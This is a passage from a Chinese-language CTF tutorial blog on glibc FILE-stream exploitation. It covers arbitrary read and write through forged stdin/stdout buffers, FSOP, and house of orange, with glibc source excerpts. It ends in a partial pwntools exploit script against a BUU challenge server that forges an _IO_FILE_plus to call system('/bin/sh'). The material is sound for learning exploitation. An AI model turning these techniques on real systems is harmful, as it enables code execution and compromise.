<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">payload = p64(<span class="hljs-number">0xfbad3887</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + <span class="hljs-string">&#x27;\x00&#x27;</span><br>libc_base = libc - libc.sym[<span class="hljs-string">&quot;_IO_2_1_stdin_&quot;</span>]<br></code></pre></td></tr></table></figure>

<p>这样泄露出来的第一个地址将会是<code>_IO_2_1_stdin_</code></p>
<h3 id="四、任意读写"><a href="#四、任意读写" class="headerlink" title="四、任意读写"></a>四、任意读写</h3><p>伪造缓冲区指针，在一定的条件下可以完成任意地址的读写</p>
<ul>
<li><code>stdin</code>标准输入缓冲区进行任意地址写。</li>
<li><code>stdout</code>标准输出缓冲区进行任意地址读写.</li>
</ul>
<h4 id="stdin-标准输入缓冲区进行任意地址写"><a href="#stdin-标准输入缓冲区进行任意地址写" class="headerlink" title="stdin 标准输入缓冲区进行任意地址写"></a>stdin 标准输入缓冲区进行任意地址写</h4><p>fread执行流程：</p>
<ol>
<li>判断<code>fp-&gt;_IO_buf_base</code>缓冲区是否为空，如果为空则调用的<code>_IO_doallocbuf</code>去初始化缓冲区。</li>
<li>在分配完缓冲区或缓冲区不为空的情况下，判断输入缓冲区是否存在数据。</li>
<li>如果输入缓冲区有数据则直接拷贝至用户缓冲区，如果没有或不够则调用<code>__underflow</code>函数执行系统调用读取数据到输入缓冲区，再拷贝到用户缓冲区。</li>
</ol>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20220320095647747.png"><span class="image-caption">image-20220320095647747</span></p>
<p>如果我们能控制缓冲区指针，使得缓冲区指向想要写的地址，那么在第三步执行系统调用读取数据到缓冲区的时候，就是执行系统调用读取数据到我们想要写的地址，从而实现任意地址写的目的。</p>
<p>具体需要满足的条件，还需要对源码进行深入的分析。</p>
<p>fread关键源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">IO_size_t<br>_IO_file_xsgetn (_IO_FILE *fp, <span class="hljs-keyword">void</span> *data, _IO_size_t n)<br>&#123;<br> ...<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      ...<br>      <span class="hljs-comment">//缓冲区为空则调用_IO_doallocbuf初始化缓冲区</span><br>    &#125;<br><br>  <span class="hljs-keyword">while</span> (want &gt; <span class="hljs-number">0</span>)<br>    &#123;<br><br>      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;<br>      <br>      <span class="hljs-keyword">if</span> (have &gt; <span class="hljs-number">0</span>) <br>        &#123;<br>          ...<br>          <span class="hljs-comment">//memcpy</span><br>          <br>        &#125;<br><br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base<br>          &amp;&amp; want &lt; (<span class="hljs-keyword">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<br>        &#123;<br>          <span class="hljs-keyword">if</span> (__underflow (fp) == EOF)  <span class="hljs-comment">//调用__underflow读入数据</span><br>      ...<br>        &#125;<br>      ...<br>  <span class="hljs-keyword">return</span> n - want;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>_IO_file_xsgetn</code>函数会先判断输入缓冲区<code>_IO_buf_base</code>是否为空，如果为空的话则调用<code>_IO_doallocbuf</code>初始化缓冲区，因此需要构造<code>_IO_buf_base</code>不为空。</p>
<p>接着当输入缓冲区有剩余时即<code>_IO_read_end -_IO_read_ptr &gt;0</code>，会将缓冲区中的数据拷贝至目标中，因此想要利用输入缓冲区实现读写，<code>_IO_read_end -_IO_read_ptr =0</code>即<code>_IO_read_end ==_IO_read_ptr</code>。</p>
<p>同时还要求读入的数据<code>size</code>要小于缓冲区数据的大小，调用<code>__underflow</code>去读取数据，否则为提高效率会调用read直接读。</p>
<p><code>__underflow</code> 源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span><br>_IO_new_file_underflow (_IO_FILE *fp)<br>&#123;<br>  _IO_ssize_t count;<br>  ...<br>  ## 如果存在_IO_NO_READS标志，则直接返回<br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)<br>    &#123;<br>      fp-&gt;_flags |= _IO_ERR_SEEN;<br>      __set_errno (EBADF);<br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  ## 如果输入缓冲区里存在数据，则直接返回<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)<br>    <span class="hljs-keyword">return</span> *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *) fp-&gt;_IO_read_ptr;<br>  ...<br><br>  ##调用_IO_SYSREAD函数最终执行系统调用读取数据<br>  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,<br>               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);<br>  ...<br><br>&#125;<br>libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)<br></code></pre></td></tr></table></figure>

<p>在<code>_IO_new_file_underflow</code>中函数会检查<code>_flags</code>是否包含<code>_IO_NO_READS</code>标志，包含则直接返回。标志定义<code>#define _IO_NO_READS 4</code>，因此<code>_flags</code>不能包含<code>4</code>。</p>
<p>接着判断<code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>是否成立，成立则直接返回，因此再次要求伪造的结构体<code>_IO_read_end ==_IO_read_ptr</code>，绕过该条件检查。</p>
<p>最终系统调用<code>_IO_SYSREAD (fp, fp-&gt;_IO_buf_base,fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)</code>读取数据。因此要想利用<code>stdin</code>输入缓冲区，需设置FILE结构体中<code>_IO_buf_base</code>为想要写入数据的起始地址，<code>_IO_buf_end</code>为结束地址。同时也需将结构体中的<code>fp-&gt;_fileno</code>设置为0，最终调用<code>read (fp-&gt;_fileno, buf, size))</code>读取数据。</p>
<p>将上述条件综合表述为：</p>
<ol>
<li>设置<code>_IO_read_end</code>等于<code>_IO_read_ptr</code>。</li>
<li>设置<code>_flag &amp;~ _IO_NO_READS</code>即<code>_flag &amp;~ 0x4</code>。</li>
<li>设置<code>_fileno</code>为0。</li>
<li>设置<code>_IO_buf_base</code>为起始地址，<code>_IO_buf_end</code>为结束地址；且使得<code>_IO_buf_end-_IO_buf_base</code>大于要读的数据。</li>
</ol>
<p>似乎不一定要是 stdin，拓展到某个 fp 指针，能够劫持该 fp 对应IO_FILE结构体，进行上述设置，也是一样的任意写，但是细想似乎会存在一些问题，具体能不能实现，还是需要实践，希望之后有空实践一下，回来填补。</p>
<h4 id="stdout-标准输入缓冲区进行任意地址读写"><a href="#stdout-标准输入缓冲区进行任意地址读写" class="headerlink" title="stdout 标准输入缓冲区进行任意地址读写"></a>stdout 标准输入缓冲区进行任意地址读写</h4><p><code>stdout</code>会将数据拷贝至输出缓冲区，并将输出缓冲区中的数据输出出来，所以如果可控<code>stdout</code>结构体，通过构造可实现利用其进行任意地址读以及任意地址写，比控制<code>stdin</code>更强大。</p>
<h4 id="任意写"><a href="#任意写" class="headerlink" title="任意写"></a>任意写</h4><p> 先看下 fwrite 源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><br>_IO_size_t<br>_IO_new_file_xsputn (_IO_FILE *f, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *data, _IO_size_t n)<br>&#123; <br>...<br>    ## 判断输出缓冲区还有多少空间<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)<br>    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="hljs-comment">/* Space available. */</span><br><br>  ## 如果输出缓冲区有空间，则先把数据拷贝至输出缓冲区<br>  <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>    ...<br>      <span class="hljs-built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);<br></code></pre></td></tr></table></figure>

<p>任意写功能的实现在于缓冲区没有满时，会先将要输出的数据复制到缓冲区中，可通过这一点来实现任意地址写的功能。</p>
<p>可以看到，任意写的实现很简单，只需将<code>_IO_write_ptr</code>指向我们要写的位置，<code>_IO_write_end</code>指写入位置的末尾处即可。</p>
<ul>
<li><code>_IO_write_ptr</code>指向写入位置的起始处</li>
<li><code>_IO_write_end</code>指向写入位置的末尾处</li>
</ul>
<h4 id="任意读"><a href="#任意读" class="headerlink" title="任意读"></a>任意读</h4><p>仍然是查看 fwrite 关键源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">_IO_size_t<br>_IO_new_file_xsputn (_IO_FILE *f, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *data, _IO_size_t n)<br>&#123; <br><br>    _IO_size_t count = <span class="hljs-number">0</span>;<br>...<br>    ## 判断输出缓冲区还有多少空间<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)<br>    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="hljs-comment">/* Space available. */</span><br><br>  ## 如果输出缓冲区有空间，则先把数据拷贝至输出缓冲区<br>  <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>)<br>    &#123;    <br>    ...<br>    <span class="hljs-comment">//memcpy</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (to_do + must_flush &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)<br></code></pre></td></tr></table></figure>

<p>当<code>f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr</code>时才会触发后续操作，所以此为一个条件。</p>
<p>接着看 _IO_OVERFLOW 的关键源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span><br>_IO_new_file_overflow (_IO_FILE *f, <span class="hljs-keyword">int</span> ch)<br>&#123;<br>  ## 判断标志位是否包含<span class="hljs-function">_IO_NO_WRITES</span><br><span class="hljs-function">  <span class="hljs-title">if</span> <span class="hljs-params">(f-&gt;_flags &amp; _IO_NO_WRITES)</span> <span class="hljs-comment">/* SET ERROR */</span></span><br><span class="hljs-function">    </span>&#123;<br>      f-&gt;_flags |= _IO_ERR_SEEN;<br>      __set_errno (EBADF);<br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br><br>  ## 判断输出缓冲区是否为空<br>  <span class="hljs-keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="hljs-number">0</span> || f-&gt;_IO_write_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      ...<br>    &#125;<br><br>  ## 输出输出缓冲区 <br>  <span class="hljs-keyword">if</span> (ch == EOF)<br>    <span class="hljs-keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,<br>             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);<br>  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>) ch;<br>&#125;<br>libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)<br></code></pre></td></tr></table></figure>

<p>首先判断<code>_flags</code>是否包含<code>_IO_NO_WRITES</code>，如果包含则直接返回，因此需构造<code>_flags</code>不包含<code>_IO_NO_WRITES</code>，其定义为<code>#define _IO_NO_WRITES 8</code>。</p>
<p>接着判断缓冲区是否为空以及是否包含<code>_IO_CURRENTLY_PUTTING</code>标志位，应当使得判断为假，因次让<code>_flags</code>包含<code>_IO_CURRENTLY_PUTTING</code>，其定义为<code>#define _IO_CURRENTLY_PUTTING 0x800</code>。</p>
<p>接着调用<code>_IO_do_write</code>去输出输出缓冲区，其传入的参数是<code>f-&gt;_IO_write_base</code>，大小为<code>f-&gt;_IO_write_ptr - f-&gt;_IO_write_base</code>。因此若想实现任意地址读，应构造<code>_IO_write_base</code>为<code>read_start</code>，构造<code>_IO_write_ptr</code>为<code>read_end</code>。</p>
<p>接着查看 _IO_do_write 关键源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span></span><br><span class="hljs-function">_IO_size_t</span><br><span class="hljs-function"><span class="hljs-title">new_do_write</span> <span class="hljs-params">(_IO_FILE *fp, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *data, _IO_size_t to_do)</span></span><br><span class="hljs-function"></span>&#123;<br>  ...<br>  _IO_size_t count;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)<br>    fp-&gt;_offset = _IO_pos_BAD;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)<br>    &#123;<br>      _IO_off64_t new_pos<br>    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">if</span> (new_pos == _IO_pos_BAD)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      fp-&gt;_offset = new_pos;<br>    &#125;<br>  ## 调用函数输出输出缓冲区<br>  count = _IO_SYSWRITE (fp, data, to_do);<br>  ...<br>  <br>  <span class="hljs-keyword">return</span> count;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在调用<code>_IO_SYSWRITE</code>之前还判断了<code>fp-&gt;_IO_read_end != fp-&gt;_IO_write_base</code>，因此需要构造结构体使得<code>_IO_read_end</code>等于<code>_IO_write_base</code>，或者构造<code>_flags</code>包含<code>_IO_IS_APPENDING</code>，<code>_IO_IS_APPENDING</code>的定义为<code>#define _IO_IS_APPENDING 0x1000</code>。</p>
<p>最后<code>_IO_SYSWRITE</code>调用<code>write (f-&gt;_fileno, data, to_do)</code>输出数据，因此还需构造<code>_fileno</code>为标准输出描述符1。</p>
<p>总结为： </p>
<ol>
<li>设置<code>_flag &amp;~ _IO_NO_WRITES</code>即<code>_flag &amp;~ 0x8</code>。</li>
<li>设置<code>_flag &amp; _IO_CURRENTLY_PUTTING</code>即<code>_flag | 0x800</code></li>
<li>设置<code>_fileno</code>为1。</li>
<li>设置<code>_IO_write_base</code>指向想要泄露的地方；<code>_IO_write_ptr</code>指向泄露结束的地址。</li>
<li>设置<code>_IO_read_end</code>等于<code>_IO_write_base</code>或设置<code>_flag &amp; _IO_IS_APPENDING</code>即<code>_flag | 0x1000</code>。</li>
<li>设置<code>_IO_write_end</code>等于<code>_IO_write_ptr</code>（非必须）。</li>
</ol>
<p>这个就是前面利用 stdout 泄露 libc 的原理，按照前面说的进行布局，适用性更广。</p>
<h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>FSOP（ File Stream Oriented Programming ），是一种劫持<code>_IO_list_all</code>来伪造文件流对象链表的利用技术，通过调用<code>_IO_flush_all_lockp</code>函数触发。该函数会在下面三种情况下被调用：</p>
<ol>
<li>libc 检测到内存错误从而执行 abort 流程时</li>
<li>执行 exit 函数时</li>
<li>main 函数返回时</li>
</ol>
<p>一般在pwn题中，我们都是构造内存错误(例如double free漏洞可以触发)，此时会产生一系列的函数调用路径，最终的调用为：<code>_IO_flush_all_lockp</code> –&gt; <code>_IO_OVERFLOW</code>，而这里的<code>_IO_OVERFLOW</code>就是文件流对象虚表的第四项指向的内容<code>_IO_new_file_overflow</code>，如下图所示</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20211122204732406-16375881553361.png"><span class="image-caption">image-20211122204732406</span></p>
<p>构造方式：首先需要将<code>_IO_list_all</code>的<code>_chain</code>指针指向伪造的堆块；然后伪造堆块的内容布局如下：</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20230110173348667.png"><span class="image-caption">image-20230110173348667</span></p>
<h3 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h3><p>著名手法，在glibc-2.24及以下可以使用，unsorted bin attack 加上 FSOP 的结合。</p>
<p>先介绍一下原理：</p>
<p>如果在分配堆块时， top chunk 不够分配，那么根据申请的大小，会通过sysmalloc 来分配，如果申请的大小小于mmap的阀值（默认为 128K，0x20000），就会扩展top chunk，将old top chunk free掉，如果大于的话，就会通过mmap申请一块新的堆块。所以可以通过把 top chunk size 改小这种方式让 top chunk 进入unsorted bin 中，从而产生 libc 地址。</p>
<p>要求：</p>
<ul>
<li>size需要大于0x20（MINSIZE）</li>
<li>prev_inuse位要为1</li>
<li>top chunk address + top chunk size 必须是页对齐的（页大小为0x1000）</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (av == <span class="hljs-literal">NULL</span><br>    || ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (mp_.mmap_threshold)<br>        &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))<span class="hljs-comment">/*这里进行判断，判断分配的大小是否大于mmap分配的阀值，如果大于就是用mmap从新分配一个堆块，否则就会扩展top chunk*/</span><br>  &#123;<br>    <span class="hljs-keyword">char</span> *mm;           <span class="hljs-comment">/* return value from mmap call*/</span><br>  try_mmap:<br>  <br>  .........<br>  ..........<br>    <span class="hljs-keyword">if</span> (old_size != <span class="hljs-number">0</span>)<br>                  &#123;<br>                    <span class="hljs-comment">/*</span><br><span class="hljs-comment">                       Shrink old_top to insert fenceposts, keeping size a</span><br><span class="hljs-comment">                       multiple of MALLOC_ALIGNMENT. We know there is at least</span><br><span class="hljs-comment">                       enough space in old_top to do this.</span><br><span class="hljs-comment">                     */</span><br>                    old_size = (old_size - <span class="hljs-number">4</span> * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;<br>                    set_head (old_top, old_size | PREV_INUSE);<br>                    set_head (chunk_at_offset (old_top, old_size),<br>                              (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>                    set_head (chunk_at_offset (old_top, old_size + <span class="hljs-number">2</span> * SIZE_SZ),<br>                              (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>                    <span class="hljs-comment">/* If possible, release the rest. */</span><br>                    <span class="hljs-keyword">if</span> (old_size &gt;= MINSIZE)<br>                      &#123;<br>                        _int_free (av, old_top, <span class="hljs-number">1</span>);<span class="hljs-comment">/*将old top chunk free掉，加入unsorted bin*/</span><br>                      &#125;<br>                  &#125;<br></code></pre></td></tr></table></figure>

<p>house of orange 利用过程：</p>
<p>利用 unsorted bin attack 将 _IO_list_all 修改为 main_arena+0x58，而IO_list_all 中的 *chain 指针位于 _IO_list_all + 0x68 的位置：即 main_arena + 0x58 + 0x68 是 small bin 中大小为0x60的位置，所以需要将 chunk 的 size 修改为0x60，让该 chunk 链入 small bin 的相应位置上，在其上布置好伪造的 _IO_FILE_plus，那么就形成了一个伪造的 chain 链。伪造这些后，只要再分配一个 chunk，就会触发 malloc_printerr，会遍历IO_llist_all，最终调用 IO_overflow 函数，以下是源码讲解部分：</p>
<p>malloc_printerr：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>           || __builtin_expect (chunksize_nomask (victim)<br>                                &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>         malloc_printerr (<span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>触发 malloc_printerr 后，会形成下列调用链：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">mallloc_printerr-&gt; __libc_message—&gt;<span class="hljs-built_in">abort</span>-&gt;flush-&gt;_IO_flush_all_lock-&gt;_IO_OVERFLOW<br>而_IO_OVERFLOW最后会调用vtable表中的__overflow 函数<br></code></pre></td></tr></table></figure>

<p>_IO_flush_all_lockp：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">_IO_flush_all_lockp (<span class="hljs-keyword">int</span> do_lock)<br>&#123;<br>  <span class="hljs-keyword">int</span> result = <span class="hljs-number">0</span>;<br>  FILE *fp;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  _IO_cleanup_region_start_noarg (flush_cleanup);<br>  _IO_lock_lock (list_all_lock);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>  <span class="hljs-keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="hljs-literal">NULL</span>; fp = fp-&gt;_chain)<br>    &#123;<br>      run_fp = fp;<br>      <span class="hljs-keyword">if</span> (do_lock)<br>        _IO_flockfile (fp);<br>      <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<span class="hljs-comment">/*一些检查，需要绕过*/</span><br>           || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>               &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<span class="hljs-comment">/*也可以绕过这个*/</span><br>           )<br>          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<span class="hljs-comment">/*遍历_IO_list_all ，选出_IO_FILE作为_IO_OVERFLOW的参数，执行函数*/</span><br>        result = EOF;<br>      <span class="hljs-keyword">if</span> (do_lock)<br>        _IO_funlockfile (fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  _IO_lock_unlock (list_all_lock);<br>  _IO_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>所以伪造的 _IO_FILE_plus 要通过下列检查：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-number">1.</span>((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br>   <br>或者是<br><span class="hljs-number">2.</span><br>_IO_vtable_offset (fp) == <span class="hljs-number">0</span> <br>&amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> <br>&amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)<br></code></pre></td></tr></table></figure>

<h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p>来自buu的题目，程序不存在 delete 函数，无法释放堆块，所以要用到前面的修改 top chunk size 的方法，从而得到 libc 地址。</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20220313210805600.png"><span class="image-caption">image-20220313210805600</span></p>
<p>漏洞点在于 edit 函数，对于写入的个数没做严格的限制，可以写入大于申请堆块长度的内容，从而存在堆溢出。</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20220313210907191.png"><span class="image-caption">image-20220313210907191</span></p>
<p>伪造 IO_FILE_plus 后的成果如下：</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20220313170817299.png"><span class="image-caption">image-20220313170817299</span></p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20220313170916290.png"><span class="image-caption">image-20220313170916290</span></p>
<p>最终只能在本地getshell</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20220313173210640.png"><span class="image-caption">image-20220313173210640</span></p>
<p>远程一直都是显示 dumped core</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20220313173230192.png"><span class="image-caption">image-20220313173230192</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./house_of_orange&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">26547</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br>	<span class="hljs-comment">#gdb.attach(p,&quot;b *$rebase(0x)&quot;)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Length of name :&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;Name :&quot;</span>)<br>    p.send(content)<br>    p.recvuntil(<span class="hljs-string">&quot;Price of Orange:&quot;</span>)<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-number">520</span>))<br>    p.recvuntil(<span class="hljs-string">&quot;Color of Orange:&quot;</span>)<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Length of name :&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    p.recvuntil(<span class="hljs-string">&quot;Name:&quot;</span>)<br>    p.send(content)<br>    p.recvuntil(<span class="hljs-string">&quot;Price of Orange:&quot;</span>)<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-number">520</span>))<br>    p.recvuntil(<span class="hljs-string">&quot;Color of Orange:&quot;</span>)<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>    p.sendlineafter(<span class="hljs-string">&quot;: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    <br>add(<span class="hljs-number">0x30</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0xf81</span>)<br>edit(payload)<br>add(<span class="hljs-number">0x1000</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br><br>add(<span class="hljs-number">0x400</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;aaaaaaaa&quot;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c5188</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>_IO_list_all = libc.symbols[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>] + libc_base<br>sys = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] <br>edit(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0xe0</span><br>log.info(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br><br>vtable_addr = heap_base + <span class="hljs-number">0x5e8</span><br>stream = <span class="hljs-string">&quot;/bin/sh\x00&quot;</span> + p64(<span class="hljs-number">0x61</span>)<br>stream += p64(<span class="hljs-number">0</span>) + p64(_IO_list_all-<span class="hljs-number">0x10</span>)<br>stream += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">2</span>) <span class="hljs-comment"># fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br>stream = stream.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">&quot;\x00&quot;</span>)<br>stream += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># mode&lt;=0</span><br>stream += p64(<span class="hljs-number">0</span>)<br>stream += 